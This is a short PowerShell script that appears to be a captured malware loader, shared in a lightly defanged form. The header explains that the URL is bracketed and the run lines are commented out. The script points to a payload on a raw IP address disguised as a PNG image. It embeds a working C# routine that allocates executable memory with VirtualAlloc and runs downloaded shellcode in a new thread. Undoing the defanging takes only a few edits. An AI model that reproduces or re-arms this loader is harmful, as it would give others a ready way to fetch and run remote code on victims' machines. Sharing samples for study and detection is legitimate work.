# Defanged this so you don't accidentally run it and infect yourself.
# The URL is broken and the execution lines at the bottom are commented out.

$BpSPkjQlTpwexxWiy = "http://158.94.208[.]104/x7GkP2mQ9zL4/my_newest_ll.png"

# $TDexppUHHc = Invoke-WebRequest -Uri $BpSPkjQlTpwexxWiy -UseBasicParsing -ErrorAction Stop

$csharpCode = @"
using System;
using System.Runtime.InteropServices;

public class rzzsYaDVjqZwk {
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    public static void Execute(byte[] payload) {
        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x3000, 0x40);
        Marshal.Copy(payload, 0, mem, payload.Length);
        IntPtr thread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(thread, 0xFFFFFFFF);
    }
}
"@

# Add-Type -TypeDefinition $csharpCode -Language CSharp
# [rzzsYaDVjqZwk]::Execute($TDexppUHHc.Content)
